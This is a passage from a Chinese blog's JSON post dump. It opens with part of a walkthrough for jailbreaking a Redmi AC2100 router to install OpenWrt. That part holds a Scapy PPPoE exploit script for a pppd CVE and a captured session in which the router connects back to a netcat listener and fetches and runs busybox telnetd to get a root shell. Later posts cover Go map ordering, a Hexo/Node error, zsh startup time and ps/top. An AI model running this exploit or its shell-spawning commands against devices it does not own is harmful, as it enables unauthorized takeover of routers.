= 8Echo_Request = 9Echo_Reply = 10Discard_Request = 11def packet_callback(pkt): global host_uniq, session_id, ident, ac_cookie, mac_router, mac_server, eth_discovery, eth_session mac_router = pkt[Ether].src eth_discovery = Ether(src=mac_server, dst=mac_router, type=PPPoE_Discovery) eth_session = Ether(src=mac_server, dst=mac_router, type=PPPoE_Session) if pkt.haslayer(PPPoED): if pkt[PPPoED].code == PADI: session_id = pkt[PPPoED].fields['sessionid'] ac_cookie = os.urandom(20) for tag in pkt[PPPoED][PPPoED_Tags].tag_list: if tag.tag_type == Host_Uniq: host_uniq = tag.tag_value print(\"Client-&gt;Server | Discovery Initiation\") print(\"Server-&gt;Client | Discovery Offer\") sendp(eth_discovery / PPPoED(code=PADO, sessionid=0) / PPPoETag(tag_type=Service_Name, tag_value=service_name) / PPPoETag(tag_type=AC_Name, tag_value=ac_name) / PPPoETag(tag_type=AC_Cookie, tag_value=ac_cookie) / PPPoETag(tag_type=Host_Uniq, tag_value=host_uniq)) elif pkt[PPPoED].code == PADR: print(\"Client-&gt;Server | Discovery Request\") print(\"Server-&gt;Client | Discovery Session-confirmation\") session_id = os.urandom(2)[0] sendp(eth_discovery / PPPoED(code=PADS, sessionid=session_id) / PPPoETag(tag_type=Service_Name, tag_value=service_name) / PPPoETag(tag_type=Host_Uniq, tag_value=host_uniq)) print(\"Server-&gt;Client | Configuration Request (PAP)\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=LCP) / PPP_LCP(code=Configure_Request, id=ident + 1, data=(Raw(PPP_LCP_MRU_Option(max_recv_unit=1492)) / Raw(PPP_LCP_Auth_Protocol_Option( auth_protocol=PAP)) / Raw(PPP_LCP_Magic_Number_Option( magic_number=magic_number))))) elif pkt.haslayer(PPPoE) and pkt.haslayer(PPP): if pkt[PPPoE].sessionid != 0: session_id = pkt[PPPoE].sessionid if pkt.haslayer(PPP_LCP_Configure): ppp_lcp = pkt[PPP_LCP_Configure] if pkt[PPP_LCP_Configure].code == Configure_Request: ident = pkt[PPP_LCP_Configure].id print(\"Client-&gt;Server | Configuration Request (MRU)\") print(\"Server-&gt;Client | Configuration Ack (MRU)\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=LCP) / PPP_LCP(code=Configure_Ack, id=ident, data=(Raw(PPP_LCP_MRU_Option(max_recv_unit=1480)) / Raw(ppp_lcp[PPP_LCP_Magic_Number_Option])))) elif pkt[PPP_LCP_Configure].code == Configure_Ack: print(\"Client-&gt;Server | Configuration Ack\") print(\"Server-&gt;Client | Echo Request\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=LCP) / PPP_LCP_Echo(code=Echo_Request, id=ident + 1, magic_number=magic_number)) elif pkt.haslayer(PPP_LCP_Echo): if pkt[PPP_LCP_Echo].code == Echo_Request: ident = pkt[PPP_LCP_Echo].id print(\"Client-&gt;Server | Echo Request\") print(\"Server-&gt;Client | Echo Reply\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=LCP) / PPP_LCP_Echo(code=Echo_Reply, id=ident, magic_number=magic_number)) elif pkt.haslayer(PPP_PAP_Request): ident = pkt[PPP_PAP_Request].id print(\"Client-&gt;Server | Authentication Request\") print(\"Server-&gt;Client | Authenticate Ack\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=PAP) / PPP_PAP_Response(code=Authenticate_Ack, id=ident, message=\"Login ok\")) print(\"Server-&gt;Client | Configuration Request (IP)\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=IPCP) / PPP_IPCP(code=Configure_Request, id=ident + 1, options=PPP_IPCP_Option_IPAddress(data=\"10.15.0.8\"))) elif pkt.haslayer(PPP_IPCP): ident = pkt[PPP_IPCP].id if pkt[PPP_IPCP].options[0].data == \"0.0.0.0\": options = [PPP_IPCP_Option_IPAddress(data=\"10.16.0.9\"), PPP_IPCP_Option_DNS1(data=\"114.114.114.114\"), PPP_IPCP_Option_DNS2(data=\"114.114.114.114\")] print(\"Client-&gt;Server | Configuration Request (invalid)\") print(\"Server-&gt;Client | Configuration Nak\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=IPCP) / PPP_IPCP(code=Configure_Nak, id=ident, options=options)) else: print(\"Client-&gt;Server | Configuration Request (valid)\") print(\"Server-&gt;Client | Configuration Ack\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=IPCP) / PPP_IPCP(code=Configure_Ack, id=ident, options=pkt[PPP_IPCP].options)) if pkt[PPP].proto == IPV6CP: print(\"Client-&gt;Server | Configuration Request IPV6CP\") print(\"Server-&gt;Client | Protocol Reject IPV6CP\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=LCP) / PPP_LCP_Protocol_Reject(code=Protocol_Reject, id=ident + 1, rejected_protocol=IPV6CP, rejected_information=pkt[PPP].payload))def terminateConnection(): print(\"Server-&gt;Client | Terminate Connection\") sendp(eth_session / PPPoE(sessionid=session_id) / PPP(proto=LCP) / PPP_LCP_Terminate())def isNotOutgoing(pkt): if pkt.haslayer(Ether): return pkt[Ether].src != mac_server return Falseif __name__ == '__main__': conf.verb = 0 # Suppress Scapy output conf.iface = interface # Set default interface mac_server = get_if_hwaddr(interface) print(\"Waiting for packets\") sniff(prn=packet_callback, filter=\"pppoed or pppoes\", lfilter=isNotOutgoing) 执行exploit 123456$ python3 pppd-cve.py sessionid:4src:00:e0:4c:6a:56:1bdst:88:c3:97:9b:51:5f.Sent 1 packets. 在执行成功后，就能看到路由器会主动连接 netcat： 12345$ netcat -nvlp 31337Connection from 192.168.31.1:5823cd /tmp &amp;&amp; wget http://192.168.31.177:8000/busybox-mipsel &amp;&amp; chmod a+x ./busybox-mipsel &amp;&amp; ./busybox-mipsel telnetd -l /bin/shConnecting to 192.168.31.177:8000 (192.168.31.177:8000)busybox-mipsel 100% |*******************************| 1590k 0:00:00 ETA 在路由器来本机的8000端口下载 busybox-mipsel 时，我们能看到我们的 HTTP Server 中有 access log： 12$ python -m SimpleHTTPServer192.168.31.1 - - [19/Jun/2020 22:57:05] \"GET /busybox-mipsel HTTP/1.1\" 200 - telnet 至路由器123456789$ telnet 192.168.31.1 ➜ ~ telnet 192.168.31.1Trying 192.168.31.1...Connected to 192.168.31.1.Escape character is '^]'.BusyBox v1.19.4 (2019-12-26 08:38:38 UTC) built-in shell (ash)Enter 'help' for a list of built-in commands. 这时，就进入了路由器的shell，我们来刷入OpenWRT： 12345678910111213141516171819202122/tmp # wget http://192.168.31.177:8000/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.binConnecting to 192.168.31.177:8000 (192.168.31.177:8000)openwrt-ramips-mt762 100% |******************************************************************************| 2377k 0:00:00 ETA/tmp #/tmp # wget http://192.168.31.177:8000/openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.binConnecting to 192.168.31.177:8000 (192.168.31.177:8000)openwrt-ramips-mt762 100% |******************************************************************************| 3840k 0:00:00 ETA/tmp #/tmp # nvram set uart_en=1/tmp # nvram set bootdelay=5/tmp # nvram set flag_try_sys1_failed=1/tmp # nvram commit/tmp # mtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1Unlocking kernel1 ...Writing from openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin to kernel1 .../tmp # mtd -r write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0Unlocking rootfs0 ...Writing from openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin to rootfs0 ...Rebooting ...Connection closed by foreign host. 此后，路由器一旦刷入OpenWRT完成后，就会自动重启。 当路由器成功进入OpenWRT后，两个蓝色都会亮起，这时我们拔掉连接WAN口和LAN1口的那条网线。 Enjoy将macOS下的网络设为自动DHCP，以让路由器自动给我们分配IP。 当路由器重启并初始化完成后，就会给本机分配IP： 此时，就可以 ssh 进入了（注意，这时候 luci 没有开启，这意味着现在还我们无法 OpenWRT的 Web管理界面）： 123456789101112131415161718192021222324252627282930313233$ ssh root@192.168.1.1@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!Someone could be eavesdropping on you right now (man-in-the-middle attack)!It is also possible that a host key has just been changed.The fingerprint for the RSA key sent by the remote host isSHA256:fsKupoDjwebF4yui/vVeMCUcZlgBIiEfSgoWM/jx2XQ.Please contact your system administrator.Add correct host key in /Users/wei.shi/.ssh/known_hosts to get rid of this message.Offending RSA key in /Users/wei.shi/.ssh/known_hosts:19Password authentication is disabled to avoid man-in-the-middle attacks.Keyboard-interactive authentication is disabled to avoid man-in-the-middle attacks.BusyBox v1.31.1 () built-in shell (ash) _______ ________ __ | |.-----.-----.-----.| | | |.----.| |_ | - || _ | -__| || | | || _|| _| |_______|| __|_____|__|__||________||__| |____| |__| W I R E L E S S F R E E D O M ----------------------------------------------------- OpenWrt SNAPSHOT, r13597-be56b29707 -----------------------------------------------------=== WARNING! =====================================There is no root password defined on this device!Use the \"passwd\" command to set up a new passwordin order to prevent unauthorized SSH logins.--------------------------------------------------root@OpenWrt:~# opkg updateroot@OpenWrt:~# opkg install luci Then, enjoy… Reference https://openwrt.org/toh/xiaomi/xiaomi_redmi_router_ac2100 https://www.youtube.com/watch?v=S3DVbvmmNOM https://github.com/Percy233/PPPoE_Simulator-for-RM2100-exploit","comments":true,"categories":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/categories/OpenWrt/"}],"tags":[{"name":"OpenWrt","slug":"OpenWrt","permalink":"http://swsmile.info/tags/OpenWrt/"}]},{"title":"【Golang】Golang 遍历 map 时 key 随机化问题","date":"2020-06-14T03:11:43.000Z","path":"2020/06/14/【Golang】Golang-遍历-map-时-key-随机化问题/","text":"Context12345678910111213141516171819202122232425262728293031package mainimport ( \"fmt\")func main() &#123; x := make(map[int]int) for i := 0; i &lt; 30; i++ &#123; x[i] = i &#125; for i := 0; i &lt; 10; i++ &#123; for k, v := range x &#123; fmt.Println(k, v) break &#125; &#125;&#125;// output 18 1829 292 22 22 216 1628 281 10 04 4 可以看到，我们进行10次遍历 map，每次遍历都只print 出第一对key-value pair，而每次遍历 print 的结果都不同。 Java 中的Hashmap123456789101112131415161718192021package com.company;import java.util.HashMap;import java.util.Map;public class Main &#123; public static void main(String[] args) &#123; HashMap&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); for (int i = 0;i&lt;10;i++)&#123; map.put(i, i); &#125; for (int i = 0;i&lt;10;i++)&#123; for(Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123; System.out.println(entry.getKey() + \": \" + entry.getValue()); break; &#125; &#125; &#125;&#125; 在Java中，并没有这个问题。 因为在 Java 中的 Hashmap 会把每个 pair object 在 heap 中的指针存在一个 array 中（根据hash 函数算出一个特定的 pair object 存储在这个 array 中的 哪个 index 位置上）。而每次遍历 map 时，都会从这个 array 的头部开始一个一个元素的扫描（如果不为 nill ，说明当前位置存储了 pair 元素）， Staightforward Idea如果希望每次遍历 map 时，访问元素的顺序均相同，可以把 key 先提前取出来，存在 slice 里，然后对 key 排序。 1234567891011import \"sort\"var m map[int]stringvar keys []intfor k := range m &#123; keys = append(keys, k)&#125;sort.Ints(keys)for _, k := range keys &#123; fmt.Println(\"Key:\", k, \"Value:\", m[k])&#125; 如何实现随机 pick map keySolution 1一种方式可以循环map； 把key放到slice中： 1234567func randMapKey(m map[string]int) string &#123; mapKeys = make([]string, 0, len(m)) // pre-allocate exact size for key := range m &#123; mapKeys = append(mapKeys, key) &#125; return mapKeys[rand.Intn(len(mapKeys))]&#125; 很容易验证这段代码确实会产生随机key。 虽然简单但是有代价：O(n) 的时间复杂度 和 O(n) 空间复杂度。 Solution 2Reference https://blog.csdn.net/hificamera/article/details/51655463 https://stackoverflow.com/questions/23482786/get-an-arbitrary-key-item-from-a-map https://lukechampine.com/hackmap.html","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【hexo】使用 node 14 运行 hexo 报错","date":"2020-06-13T14:44:15.000Z","path":"2020/06/13/【hexo】使用-node-14-运行-hexo-报错/","text":"Situation123456789101112131415161718192021222324252627282930313233$ hexo gFATAL Something's wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlTypeError [ERR_INVALID_ARG_TYPE]: The \"mode\" argument must be integer. Received an instance of Object at copyFile (fs.js:1895:10) at tryCatcher (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/util.js:16:23) at ret (eval at makeNodePromisifiedEval (/usr/local/lib/node_modules/hexo-cli/node_modules/bluebird/js/release/promisify.js:184:12), &lt;anonymous&gt;:13:39) at /SW/myBlog/node_modules/hexo-deployer-git/node_modules/hexo-fs/lib/fs.js:144:39 at tryCatcher (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:517:31) at Promise._settlePromise (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:574:18) at Promise._settlePromise0 (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:619:10) at Promise._settlePromises (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:699:18) at Promise._fulfill (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:643:18) at Promise._resolveCallback (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:437:57) at Promise._settlePromiseFromHandler (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:529:17) at Promise._settlePromise (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:574:18) at Promise._settlePromise0 (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:619:10) at Promise._settlePromises (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:699:18) at Promise._fulfill (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:643:18) at Promise._resolveCallback (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:437:57) at Promise._settlePromiseFromHandler (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:529:17) at Promise._settlePromise (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:574:18) at Promise._settlePromise0 (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:619:10) at Promise._settlePromises (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:699:18) at Promise._fulfill (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:643:18) at Promise._resolveCallback (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:437:57) at Promise._settlePromiseFromHandler (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:529:17) at Promise._settlePromise (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:574:18) at Promise._settlePromise0 (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:619:10) at Promise._settlePromises (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:699:18) at Promise._fulfill (/SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/promise.js:643:18) at /SW/myBlog/node_modules/hexo-deployer-git/node_modules/bluebird/js/release/nodeback.js:42:21 at FSReqCallback.oncomplete (fs.js:163:23) Solution出现这些是因为node版本太高，切换成低版本的node来运行Hexo就可以了。 之前安装的是 node14版本。 123456789101112131415$ brew uninstall node$ brew search node==&gt; Formulaelibbitcoin-node node node-sass node@12 ✔ nodebrew nodenvllnode node-build node@10 node_exporter nodeenv==&gt; Casksnodebox nodeclipseIf you meant \"node\" specifically:It was migrated from homebrew/cask to homebrew/core.$ brew install node@12...$ brew link node@12$ echo \"\\n\" &gt;&gt; ~/.zshrc; export PATH=\"/usr/local/opt/node@12/bin:$PATH\"","comments":true,"categories":[{"name":"hexo","slug":"hexo","permalink":"http://swsmile.info/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"http://swsmile.info/tags/hexo/"}]},{"title":"【Linux】Oh-my-zsh 启动慢","date":"2020-06-13T13:59:07.000Z","path":"2020/06/13/【Linux】Oh-my-zsh-启动慢/","text":"升级1$ upgrade_oh_my_zsh 启动测速123$ time /bin/zsh -i -c exit$ for i in $(seq 1 10); do /usr/bin/time $SHELL -i -c exit; done 测速原生bash 启动速度1$ for i in $(seq 1 10); do /usr/bin/time bash -i -c exit; done zsh 的启动脚本当默认 shell 为 zsh 时，且当开启一个新 tab 时（或者一台主机通过 SSH 登录本主机时），/etc/zprofile 、/etc/zshrc 和 ~/.zshrc 均会被执行 ，且执行顺序为： /etc/zprofile /etc/zshrc ~/.zshrc 当开启一个新 tab 时， 1234Last login: Sat Jun 13 11:46:23 on ttys006execute /etc/zprofileexecute /etc/zshrcexecute ~/.zshrc 当一台主机通过 SSH 登录本主机时 123456$ ssh wei.shi@192.168.16.173Last login: Sat Jun 13 11:54:43 2020execute /etc/zprofileexecute /etc/zshrcexecute ~/.zshrc~ $ 当启用一个新zsh 进程时 1234$ zshexecute /etc/zshrcexecute ~/.zshrc$ Solution将zsh 的启动脚本中耗时的命令移除，使用 alias，在需要执行的时候，再去执行它们。 Reference https://blog.jonlu.ca/posts/speeding-up-zsh","comments":true,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://swsmile.info/tags/Linux/"}]},{"title":"【Linux】查看当前所有进程","date":"2020-06-13T08:36:54.000Z","path":"2020/06/13/【Linux】操作-查看当前所有进程/","text":"ps 命令Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。ps命令列出的是当前那些进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用top命令。要对进程进行监测和控制，首先必须要了解当前进程的情况，也就是需要查看当前进程，而 ps 命令就是最基本同时也是非常强大的进程查看命令。使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等。总之大部分信息都是可以通过执行该命令得到的。 ps 让我们查看所有进程在某一时间点的状态（这意味着，如果你想每隔 1s 查看一次，就需要使用top 了 ）。 linux上进程有5种状态: 运行(正在运行或在运行队列中等待) 中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号) 不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生) 僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放) 停止(进程收到SIGSTOP, SIGSTP, SIGTIN, SIGTOU信号后停止运行运行) ps工具标识进程的5种状态码: D 不可中断 uninterruptible sleep (usually IO) R 运行 runnable (on run queue) S 中断 sleeping T 停止 traced or stopped Z 僵死 a defunct (”zombie”) process 命令参数 -a ：显示所有进程（Display information about other users’ processes as well as your own. This will skip any processes which do not have a controlling terminal, unless the -x option is also specified.） -A：Display information about other users’ processes, including those without controlling terminals. -c 只显示进程的可执行名称（默认情况下，会显示该进程启动时，attch上的所有参数）（Change the ``command’’ column output to just contain the executable name, rather than the full command line.） 1234567891011121314151617181920$ ps -l UID PID PPID F CPU PRI NI SZ RSS WCHAN S ADDR TTY TIME CMD2061703888 83362 79780 4006 0 31 0 4364072 15128 - Ss 0 ttys000 0:00.06 /Applications/iTerm.app/Contents/MacOS2061703888 83367 83366 4006 0 31 0 4363944 3724 - S+ 0 ttys000 0:00.23 -zsh2061703888 83628 79780 4006 0 31 0 4364072 15132 - Ss 0 ttys001 0:00.10 /Applications/iTerm.app/Contents/MacOS2061703888 83636 83635 4006 0 31 0 4371624 4364 - S 0 ttys001 0:00.31 -zsh2061703888 74895 43204 4006 0 31 0 4596272 23312 - Ss+ 0 ttys002 1:14.06 /private/var/folders/gb/jjnm5jv56wv9j12061703888 81859 79780 4006 0 31 0 4364072 15108 - Ss 0 ttys003 0:00.04 /Applications/iTerm.app/Contents/MacOS2061703888 81861 81860 4006 0 31 0 4371776 3832 - S+ 0 ttys003 0:00.52 -zsh2061703888 9843 479 4006 0 31 0 4356084 1276 - Ss+ 0 ttys010 0:00.29 /bin/zsh --login -i$ ps -lc UID PID PPID F CPU PRI NI SZ RSS WCHAN S ADDR TTY TIME CMD2061703888 83362 79780 4006 0 31 0 4364072 15128 - Ss 0 ttys000 0:00.06 iTerm22061703888 83367 83366 4006 0 31 0 4363944 3724 - S+ 0 ttys000 0:00.23 -zsh2061703888 83628 79780 4006 0 31 0 4364072 15132 - Ss 0 ttys001 0:00.10 iTerm22061703888 83636 83635 4006 0 31 0 4371624 4372 - S 0 ttys001 0:00.31 -zsh2061703888 74895 43204 4006 0 31 0 4596272 23312 - Ss+ 0 ttys002 1:14.06 ___server_main2061703888 81859 79780 4006 0 31 0 4364072 15108 - Ss 0 ttys003 0:00.04 iTerm22061703888 81861 81860 4006 0 31 0 4371776 3832 - S+ 0 ttys003 0:00.52 -zsh2061703888 9843 479 4006 0 31 0 4356084 1276 - Ss+ 0 ttys010 0:00.29 zsh -N 反向选择 -E 显示每个进程执行时的环境变量 123456$ ps -E PID TTY TIME CMD83362 ttys000 0:00.06 /Applications/iTerm.app/Contents/MacOS/iTerm2 --server login -fp wei.shi TERM_SESSION_ID=w0t0p1:741916E9-C8FA-41DD-BDF2-C0AC2DBB6B12 SSH_AUTH_SOCK=/private/tmp/com.a83367 ttys000 0:00.26 -zsh TERM_SESSION_ID=w0t0p1:741916E9-C8FA-41DD-BDF2-C0AC2DBB6B12 SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.cDMObZjFUz/Listeners LC_TERMINAL_VERSION=3.3.4 Apple_Pu74895 ttys002 1:15.11 /private/var/folders/gb/jjnm5jv56wv9j15djld4f77sxf66ph/T/___server_main PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/go/bin:/Applications/Wireshark.a81859 ttys003 0:00.04 /Applications/iTerm.app/Contents/MacOS/iTerm2 --server login -fp wei.shi TERM_SESSION_ID=w0t0p0:3A8836BA-23DD-49B9-AD79-11BE500CECED SSH_AUTH_SOCK=/private/tmp/com.a -f 显示进程之间的继承关系（Display the uid, pid, parent pid, recent CPU usage, process start time, controlling tty, elapsed CPUusage, and the associated command. If the -u option is also used, display the user name rather then the numeric uid. When -o or -O is used to add to the display following -f, the command field is not truncated as severely as it is in other formats.） -H 显示树状结构 r 显示当前终端的进程 T 显示当前终端的所有程序 -u 指定用户的所有进程 -au 显示较详细的资讯 -aux 显示所有包含其他使用者的行程 -C &lt;命令&gt; 列出指定命令的状况 --lines&lt;行数&gt; 每页显示的行数 --width&lt;字符数&gt; 每页显示的字符数 --help 显示帮助信息 --version 显示版本显示 列含义12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 %cpu percentage CPU usage (alias pcpu)%mem percentage memory usage (alias pmem) acflag accounting flag (alias acflg) args command and arguments comm command command command and arguments cpu short-term CPU usage factor (for scheduling) etime elapsed running time flags the process flags, in hexadecimal (alias f) gid processes group id (alias group) inblk total blocks read (alias inblock) jobc job control count ktrace tracing flags ktracep tracing vnode lim memoryuse limit logname login name of user who started the session lstart time started majflt total page faults minflt total page reclaims msgrcv total messages received (reads from pipes/sockets) msgsnd total messages sent (writes on pipes/sockets) nice nice value (alias ni) nivcsw total involuntary context switches nsigs total signals taken (alias nsignals) nswap total swaps in/out nvcsw total voluntary context switches nwchan wait channel (as an address) oublk total blocks written (alias oublock) p_ru resource usage (valid only for zombie) paddr swap address pagein pageins (same as majflt) pgid process group number pid process ID ppid parent process ID pri scheduling priority re core residency time (in seconds; 127 = infinity) rgid real group ID rss resident set size ruid real user ID ruser user name (from ruid) sess session ID sig pending signals (alias pending) sigmask blocked signals (alias blocked) sl sleep time (in seconds; 127 = infinity) start time started state symbolic process state (alias stat) svgid saved gid from a setgid executable svuid saved UID from a setuid executable tdev control terminal device number time accumulated CPU time, user + system (alias cputime) tpgid control terminal process group ID tsess control terminal session ID tsiz text size (in Kbytes) tt control terminal name (two letter abbreviation) tty full name of control terminal ucomm name to be used for accounting uid effective user ID upr scheduling priority on return from system call (alias usrpri) user user name (from UID) utime user CPU time (alias putime) vsz virtual size in Kbytes (alias vsize) wchan wait channel (as a symbolic name) wq total number of workqueue threads wqb number of blocked workqueue threads wqr number of running workqueue threads wql workqueue limit status (C = constrained thread limit, T = total thread limit) xstat exit or stop status (valid only for stopped or zombie process) UsageUsage 1 - 显示所有进程信息12345678910111213141516$ ps -A PID TTY TIME CMD 1 ?? 52:55.05 /sbin/launchd 40 ?? 0:23.83 /usr/sbin/syslogd 41 ?? 1:10.95 /usr/libexec/UserEventAgent (System) 44 ?? 0:17.96 /System/Library/PrivateFrameworks/Uninstall.framework/Resources/uninstalld 45 ?? 0:37.69 /usr/libexec/kextd 46 ?? 27:27.20 /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/FSEvents.framework/Versions/A 48 ?? 92:30.30 /opt/cisco/anyconnect/bin/vpnagentd -execv_instance 51 ?? 18:25.02 /Library/Application Support/org.pqrs/Karabiner-Elements/bin/karabiner_observer 53 ?? 9:09.17 /Library/Application Support/org.pqrs/Karabiner-Elements/bin/karabiner_grabber 54 ?? 0:05.28 /System/Library/CoreServices/appleeventsd --server 55 ?? 17:31.54 /usr/sbin/systemstats --daemon 57 ?? 1:03.97 /usr/libexec/configd 59 ?? 41:41.36 /Library/Application Support/iStat Menus 6/iStatMenusDaemon ... Usage 2 - 显示指定用户信息123456789101112$ ps -u root UID PID TTY TIME CMD 0 1 ?? 52:55.23 /sbin/launchd 0 40 ?? 0:23.83 /usr/sbin/syslogd 0 41 ?? 1:10.96 /usr/libexec/UserEventAgent (System) 0 44 ?? 0:17.96 /System/Library/PrivateFrameworks/Uninstall.framework/Resources/uninstalld 0 45 ?? 0:37.69 /usr/libexec/kextd 0 46 ?? 27:27.26 /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/FSEvents.framework/Vers 0 48 ?? 92:30.30 /opt/cisco/anyconnect/bin/vpnagentd -execv_instance 0 51 ?? 18:25.18 /Library/Application Support/org.pqrs/Karabiner-Elements/bin/karabiner_observer 0 53 ?? 9:09.22 /Library/Application Support/org.pqrs/Karabiner-Elements/bin/karabiner_grabber 0 55 ?? 17:31.55 /usr/sbin/systemstats --daemon Usage 3 - 显示进程的父子（继承）关系可以看到，多了一列 PPID，用于指明当前进程的父进程 PID。 1234567891011121314151617181920212223$ ps -ef UID PID PPID C STIME TTY TIME CMD 0 1 0 0 1Jun20 ?? 53:01.91 /sbin/launchd 0 40 1 0 1Jun20 ?? 0:23.91 /usr/sbin/syslogd 0 41 1 0 1Jun20 ?? 1:11.16 /usr/libexec/UserEventAgent (System) 0 44 1 0 1Jun20 ?? 0:18.00 /System/Library/PrivateFrameworks/Uninstall.framework/Resources/uninstalld 0 45 1 0 1Jun20 ?? 0:38.97 /usr/libexec/kextd 0 46 1 0 1Jun20 ?? 27:29.17 /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/FSEvents.framework/Versions/A/Support/fseventsd 0 48 1 0 1Jun20 ?? 92:30.52 /opt/cisco/anyconnect/bin/vpnagentd -execv_instance 0 51 1 0 1Jun20 ?? 18:26.60 /Library/Application Support/org.pqrs/Karabiner-Elements/bin/karabiner_observer 0 53 1 0 1Jun20 ?? 9:10.25 /Library/Application Support/org.pqrs/Karabiner-Elements/bin/karabiner_grabber 55 54 1 0 1Jun20 ?? 0:05.30 /System/Library/CoreServices/appleeventsd --server 0 55 1 0 1Jun20 ?? 17:36.88 /usr/sbin/systemstats --daemon 0 57 1 0 1Jun20 ?? 1:04.53 /usr/libexec/configd 0 59 1 0 1Jun20 ?? 41:47.05 /Library/Application Support/iStat Menus 6/iStatMenusDaemon 0 60 1 0 1Jun20 ?? 5:16.99 /System/Library/CoreServices/powerd.bundle/powerd 0 63 1 0 1Jun20 ?? 7:30.96 /usr/libexec/logd 0 66 1 0 1Jun20 ?? 0:38.08 /Library/Application Support/iStat Menus 6/iStatMenusFans 0 71 1 0 1Jun20 ?? 14:25.34 /System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Support/mds 0 73 1 0 1Jun20 ?? 1:59.12 /usr/libexec/diskarbitrationd 0 77 1 0 1Jun20 ?? 0:02.47 /System/Library/CoreServices/backupd.bundle/Contents/Resources/backupd-helper -launchd 0 82 1 0 1Jun20 ?? 3:55.54 /usr/libexec/opendirectoryd ... 查看当前 shell 进程的PID 1$ echo $$ top1$ top -d 1 -n 10 每隔1s打印一次，总共打印10次： 含义 PID：进程在系统中的ID #TH 程序当前所用的线程数 STAT：进程的状态，其中S表示休眠，R表示正在运行，Z表示僵死状态，N表示该进程优先值是负数。 us — 用户空间占用CPU的百分比。 sy — 内核空间占用CPU的百分比。 ni — 改变过优先级的进程占用CPU的百分比 id — 空闲CPU百分比 wa — IO等待占用CPU的百分比 hi — 